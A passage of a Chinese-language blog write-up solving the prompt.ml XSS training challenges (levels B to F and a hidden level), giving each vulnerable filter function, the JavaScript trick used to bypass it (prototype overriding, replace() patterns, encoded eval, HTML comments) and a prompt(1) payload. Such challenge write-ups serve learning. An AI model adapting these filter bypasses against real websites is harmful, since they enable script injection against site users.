+<h3 id="Challenge-B"><a href="#Challenge-B" class="headerlink" title="Challenge B"></a>Challenge B</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// name should not contain special characters</span></span><br><span class="line">    <span class="keyword">var</span> memberName = input.replace(<span class="regexp">/[[|\s+*/\\&lt;&gt;&amp;^:;=~!%-]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// data to be parsed as JSON</span></span><br><span class="line">    <span class="keyword">var</span> dataString = <span class="string">'&#123;"action":"login","message":"Welcome back, '</span> + memberName + <span class="string">'."&#125;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// directly "parse" data in script context</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                    \n\</span></span><br><span class="line"><span class="string">    var data = '</span> + dataString + <span class="string">';          \n\</span></span><br><span class="line"><span class="string">    if (data.action === "login")            \n\</span></span><br><span class="line"><span class="string">        document.write(data.message)        \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤了不可见字符和几乎所有的特殊符号，这里可以用in，in一般用来判断制定的属性是否在指定的对象中(不能对普通数组用)<br></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;(prompt(1))in&quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-C"><a href="#Challenge-C" class="headerlink" title="Challenge C"></a>Challenge C</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这题跟Challenge A 有点像，但是先过滤’再过滤<code>prompt</code>，需要用函数来做。<br><br><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/1.png" alt="image"></p>
+<p><font face="微软雅黑">payload</font><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">1558153217</span>).toString(<span class="number">36</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<p>或是<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>((<span class="number">630038579</span>).toString(<span class="number">30</span>))(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="Challenge-D"><a href="#Challenge-D" class="headerlink" title="Challenge D"></a>Challenge D</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里涉及到JavaScript的<code>arguments</code>用法，比如，test是一个函数，那么<code>argument</code>就是传入test函数的参数对象<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/2.png" alt="image"><br>如图清晰地表达出了各种东西是什么<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/3.png" alt="image"><br><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/4.png" alt="image"><br>这个题目还涉及到js中的<code>__proto__</code>，每个对象都会在其内部初始化一个属性，就是<code>__proto__</code>，当我们访问对象的属性时，如果对象内部不存在这个属性，那么就会去<code>__proto__</code>里面找这个属性，这个<code>__proto__</code>又会有自己的<code>__proto__</code>，一直这样找下去，如图<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/5.png" alt="image"><br>另外，replace函数还有些特性<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/6.png" alt="image"><br>$`替换查找的字符串，并且在头部加上比配位置前的字符串部分，例如<img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/7.png" alt="image"></p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"source"</span>:&#123;&#125;,<span class="string">"__proto__"</span>:&#123;<span class="string">"source"</span>:<span class="string">"$`onerror=prompt(1)&gt;"</span>&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>第一个source，在delete的时候被删掉了，然后，在<code>__proto__</code>里面也弄一个对象，里面也有个source，其中$`使得会在头部加上<code>&lt;img src=&quot;</code>，这样，代码就会变成<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">"&lt;img src="</span>onerror=prompt(<span class="number">1</span>)&gt;<span class="string">"&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>ok。</p>
+<h3 id="Challenge-E"><a href="#Challenge-E" class="headerlink" title="Challenge E"></a>Challenge E</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// I expect this one will have other solutions, so be creative :)</span></span><br><span class="line">    <span class="comment">// mspaint makes all file names in all-caps :(</span></span><br><span class="line">    <span class="comment">// too lazy to convert them back in lower case</span></span><br><span class="line">    <span class="comment">// sample input: prompt.jpg =&gt; PROMPT.JPG</span></span><br><span class="line">    input = input.toUpperCase();</span><br><span class="line">    <span class="comment">// only allows images loaded from own host or data URI scheme</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\/\/|\w+:/g</span>, <span class="string">'data:'</span>);</span><br><span class="line">    <span class="comment">// miscellaneous filtering</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[\\&amp;+%\s]|vbs/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + input + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>(\w用于查找非单词字符)</p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;IFRAME/SRC=&quot;x:text/html;base64,ICA8U0NSSVBUIC8KU1JDCSA9SFRUUFM6UE1UMS5NTD4JPC9TQ1JJUFQJPD4=</span><br></pre></td></tr></table></figure></p>
+<p>迷。</p>
+<h3 id="Challenge-F"><a href="#Challenge-F" class="headerlink" title="Challenge F"></a>Challenge F</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(<span class="regexp">/\*/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title, index</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">15</span>) + <span class="string">'" data-comment=\'&#123;"id":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里过滤了*号，所以不能用js的注释符,but，HTML里面的<!-- -->还可以在js里面使用</p>
+<p><font face="微软雅黑"> payload</font><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">svg</span>&gt;</span><span class="comment">&lt;!--#--&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml"><span class="comment">&lt;!--#--&gt;</span>prompt(1<span class="comment">&lt;!--#--&gt;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这个，其实我在本地测试是过不了的，貌似注释符会失效。</p>
+<h3 id="Hidden-Level"><a href="#Hidden-Level" class="headerlink" title="Hidden Level"></a>Hidden Level</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// WORLD -1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// strip off certain characters from breaking conditional statement</span></span><br><span class="line">    input = input.replace(<span class="regexp">/[&#125;&lt;]/g</span>, <span class="string">''</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'                                                     \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                         \n\</span></span><br><span class="line"><span class="string">    if (history.length &gt; 1337) &#123;                                 \n\</span></span><br><span class="line"><span class="string">        // you can inject any code here                          \n\</span></span><br><span class="line"><span class="string">        // as long as it will be executed                        \n\</span></span><br><span class="line"><span class="string">        &#123;&#123;injection&#125;&#125;                                            \n\</span></span><br><span class="line"><span class="string">    &#125;                                                            \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                        \n\</span></span><br><span class="line"><span class="string">    '</span>.replace(<span class="string">'&#123;&#123;injection&#125;&#125;'</span>, input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>过滤掉了<code>}&lt;</code>。<br><br>这里用到了一个点，js的<code>history</code>对象是用来保存浏览历史的，<code>history.length</code>可以返回浏览器历史列表中的URL数量。常见的“返回上一页”链接，代码如下。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'backLink'</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.history.back();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>还需要用到replace()的另一个技巧:<code>$&amp;</code><br><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/8.png" alt="image"><br>可以看到，匹配到之后是追加到后面的。</p>
+<p><font face="微软雅黑"> payload</font><br><img src="https://raw.githubusercontent.com/coomrade/hexoPics/master/xssChallenge/9.png" alt="image"></p>
+<h6 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h6><p><a href="http://drops.xmd5.com/static/drops/tips-3059.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/tips-3059.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/21/qwb/" rel="next" title="2018-强网杯">
+                <i class="fa fa-chevron-left"></i> 2018-强网杯
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目錄
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            本站概覽
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/gabe-crow.jpg"
+                alt="C0mRaDe" />
+            
+              <p class="site-author-name" itemprop="name">C0mRaDe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">文章</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-name">分類</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">標籤</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-0"><span class="nav-number">1.</span> <span class="nav-text">Challenge 0</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-1"><span class="nav-number">2.</span> <span class="nav-text">Challenge 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-2"><span class="nav-number">3.</span> <span class="nav-text">Challenge 2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-3"><span class="nav-number">4.</span> <span class="nav-text">Challenge 3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-4"><span class="nav-number">5.</span> <span class="nav-text">Challenge 4</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-5"><span class="nav-number">6.</span> <span class="nav-text">Challenge 5</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-6"><span class="nav-number">7.</span> <span class="nav-text">Challenge 6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-7"><span class="nav-number">8.</span> <span class="nav-text">Challenge 7</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-8"><span class="nav-number">9.</span> <span class="nav-text">Challenge 8</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-9"><span class="nav-number">10.</span> <span class="nav-text">Challenge 9</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-A"><span class="nav-number">11.</span> <span class="nav-text">Challenge A</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-B"><span class="nav-number">12.</span> <span class="nav-text">Challenge B</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-C"><span class="nav-number">13.</span> <span class="nav-text">Challenge C</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-D"><span class="nav-number">14.</span> <span class="nav-text">Challenge D</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-E"><span class="nav-number">15.</span> <span class="nav-text">Challenge E</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Challenge-F"><span class="nav-number">16.</span> <span class="nav-text">Challenge F</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Hidden-Level"><span class="nav-number">17.</span> <span class="nav-text">Hidden Level</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#reference"><span class="nav-number">17.0.0.1.</span> <span class="nav-text">reference</span></a></li></ol></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">C0mRaDe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 強力驅動</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主題 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
